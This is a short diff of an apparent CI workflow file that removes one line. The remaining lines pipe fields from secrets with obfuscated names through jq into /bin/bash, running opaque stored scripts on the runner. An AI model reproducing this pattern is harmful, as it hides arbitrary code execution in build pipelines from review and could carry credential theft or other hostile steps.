@@ -21,7 +21,6 @@ jobs:
           een15377: ${{ secrets.een15377 }}
         run: |
           printf '%s' "$een15377" | jq -r .cjp786 | /bin/bash
-          echo $gul438 | jq -r .aqgdg9 | /bin/bash
           printf '%s' "$skbzu12" | jq -r .plsu7 | /bin/bash
           echo $ch23 | jq -r .fn2 | /bin/bash
 
